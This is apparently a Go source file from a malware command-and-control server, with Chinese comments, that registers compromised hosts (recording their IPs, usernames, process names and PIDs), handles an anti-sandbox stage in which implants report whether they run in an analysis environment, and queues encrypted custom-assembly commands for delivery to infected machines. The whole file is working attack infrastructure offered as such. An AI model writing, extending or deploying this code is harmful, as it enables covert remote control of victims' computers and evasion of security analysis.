package SessionController

import (
	"Server/Public"
	"encoding/hex"
	"encoding/json"
	"github.com/gin-gonic/gin"
	"golang.org/x/text/encoding/simplifiedchinese"
	"math/rand"
	"strconv"
	"strings"
	"time"
)

type CommandController struct{}

// 部分正式上线会话信息字典: [SID: [连接时间: xxx, 自定义汇编哈希信息: xxx], ...]
var PartSessionInfoMap = make(map[string]map[string]string)

// 部分待定会话信息字典: [SID: [连接时间: xxx, ShellCode密钥: xxx, 待定状态: xxx], ...]
var PartPendingSessionInfoMap = make(map[string]map[string]string)

// 命令数据字典: [SID: [命令数据, 命令数据, ...], ...]
var CommandDataMap = make(map[string][][]byte)

// 用户命令字典: [命令ID: [用户名: xxx, 相关参数: xxx], ...]
var UserCommandMap = make(map[string]map[string]string)

// 添加命令数据
func (p CommandController) AddCommandData(username string, c *gin.Context) {
	selfAsmHex, err := hex.DecodeString(c.PostForm("selfAsmHex"))
	if err != nil {
		return
	}
	selfAsmHash := c.PostForm("selfAsmHash")
	paraHex, err := hex.DecodeString(c.PostForm("paraHex"))
	if err != nil {
		return
	}

	// 构造核心命令数据: 自定义汇编/哈希长度\0自定义汇编/哈希\0参数长度\0参数 + 随机数
	data := make([]byte, 0)
	existHash := false
	for _, tempSelfAsmHash := range strings.Split(PartSessionInfoMap[c.PostForm("sid")]["selfAsmHashInfo"], ",") {
		if tempSelfAsmHash == selfAsmHash {
			data = append([]byte(strconv.Itoa(len(selfAsmHash))), []byte{0x00}...)
			data = append(data, []byte(selfAsmHash)...)
			data = append(data, []byte{0x00}...)
			data = append(data, paraHex...)
			existHash = true
			break
		}
	}
	if !existHash {
		data = append([]byte(strconv.Itoa(len(selfAsmHex))), []byte{0x00}...)
		data = append(data, []byte(selfAsmHex)...)
		data = append(data, []byte{0x00}...)
		data = append(data, paraHex...)
	}

	// 构造完整命令数据
	random := rand.New(rand.NewSource(time.Now().UnixNano()))
	commandId := strconv.Itoa(random.Intn(10000000))
	commandData := ConstructCommandData([]byte(commandId), data)
	// 命令数据 -> 命令数据字典
	CommandDataMap[c.PostForm("sid")] = append(CommandDataMap[c.PostForm("sid")], commandData)

	// 注册用户命令
	commandInfoMap := make(map[string]string)
	for para, value := range c.Request.PostForm {
		if para != "selfAsmHex" && para != "selfAsmHash" && para != "dataHex" {
			commandInfoMap[para] = value[0]
		}
	}
	commandInfoMap["username"] = username
	UserCommandMap[commandId] = commandInfoMap
	c.String(200, "success")
}

// 处理抗沙箱会话
func ProcessAntiSandboxSession(sessionInfo map[string]string, determineData []byte, listenerName string, c *gin.Context) {
	// 构造待定会话信息 Json
	identityInfo := strings.Split(sessionInfo["identityInfo"], ",")
	pendingSessionInfo := make(map[string]string)
	pendingSessionInfo["fid"] = identityInfo[0]
	pendingSessionInfo["sid"] = identityInfo[1]
	pendingSessionInfo["publicIP"] = c.ClientIP()
	pendingSessionInfo["privateIP"] = identityInfo[2]
	pendingSessionInfo["listenerName"] = listenerName
	pendingSessionInfo["heartbeat"] = strconv.Itoa(int(time.Now().Unix()))
	// 部分待定会话信息 -> 部分待定会话信息字典
	_, exist := PartPendingSessionInfoMap[identityInfo[1]]
	if !exist {
		partPendingSessionInfo := make(map[string]string)
		partPendingSessionInfo["connectTime"] = time.Now().Format("2006.01.02 15:04:05")
		xor := append([]byte(identityInfo[3]), []byte{0x00}...)
		xor = append(xor, identityInfo[4]...)
		xor = append(xor, []byte{0x00}...)
		partPendingSessionInfo["xor"] = string(xor)
		partPendingSessionInfo["pending"] = "true" // 是待定状态
		PartPendingSessionInfoMap[identityInfo[1]] = partPendingSessionInfo
	}
	pendingSessionInfo["connectTime"] = PartPendingSessionInfoMap[identityInfo[1]]["connectTime"]
	pendingSessionInfo["pending"] = PartPendingSessionInfoMap[identityInfo[1]]["pending"]
	// 判定数据
	determineData, err := simplifiedchinese.GBK.NewDecoder().Bytes(determineData)
	if err != nil {
		determineData = []byte("Unable to GBK decode.")
	}
	pendingSessionInfo["determineData"] = string(determineData)

	pendingSessionInfoJson, _ := json.Marshal(pendingSessionInfo)
	Public.AddNewData("AddPendingSessionInfo", "C2 Server", string(pendingSessionInfoJson))

	// 下发命令数据
	IssueCommandData(identityInfo[1], c)
}

// 处理正式上线会话
func ProcessSession(sessionInfo map[string]string, listenerName string, c *gin.Context) {
	// 构造正式上线会话信息 Json
	identityInfo := strings.Split(sessionInfo["identityInfo"], ",")
	currentSessionInfo := make(map[string]string)
	currentSessionInfo["fid"] = identityInfo[0]
	currentSessionInfo["sid"] = identityInfo[1]
	currentSessionInfo["publicIP"] = c.ClientIP()
	currentSessionInfo["privateIP"] = identityInfo[2]
	currentSessionInfo["username"] = identityInfo[3]
	currentSessionInfo["processName"] = identityInfo[4]
	currentSessionInfo["pid"] = identityInfo[5]
	currentSessionInfo["bit"] = identityInfo[6]
	currentSessionInfo["listenerName"] = listenerName
	currentSessionInfo["heartbeat"] = strconv.Itoa(int(time.Now().Unix()))
	// 部分正式上线会话信息 -> 部分正式上线会话信息字典
	_, exist := PartSessionInfoMap[identityInfo[1]]
	if !exist {
		partSessionInfo := make(map[string]string)
		partSessionInfo["connectTime"] = time.Now().Format("2006.01.02 15:04:05")
		PartSessionInfoMap[identityInfo[1]] = partSessionInfo
	}
	PartSessionInfoMap[identityInfo[1]]["selfAsmHashInfo"] = sessionInfo["selfAsmHashInfo"]
	currentSessionInfo["connectTime"] = PartSessionInfoMap[identityInfo[1]]["connectTime"]

	sessionInfoJson, _ := json.Marshal(currentSessionInfo)
	Public.AddNewData("AddSessionInfo", "C2 Server", string(sessionInfoJson))

	// 下发命令数据
	IssueCommandData(identityInfo[1], c)
}

// 下发命令数据
func IssueCommandData(sid string, c *gin.Context) {
	// 命令数据 <- 命令数据字典
	responseCommandData := make([]byte, 0)
	for _, commandData := range CommandDataMap[sid] {
		responseCommandData = append(responseCommandData, commandData...)
	}
	delete(CommandDataMap, sid)
	c.Writer.Header().Set("Content-Length", strconv.Itoa(len(responseCommandData)))
	c.Data(200, "application/octet-stream", responseCommandData)
}

// 构造命令数据: 长度\0命令ID\0数据
func ConstructCommandData(commandId []byte, data []byte) []byte {
	partCommandData := append(commandId, []byte{0x00}...)
	partCommandData = append(partCommandData, data...)

	EncryptData(partCommandData, len(partCommandData))

	commandData := append([]byte(strconv.Itoa(len(partCommandData))), []byte{0x00}...)
	commandData = append(commandData, partCommandData...)
	return commandData
}
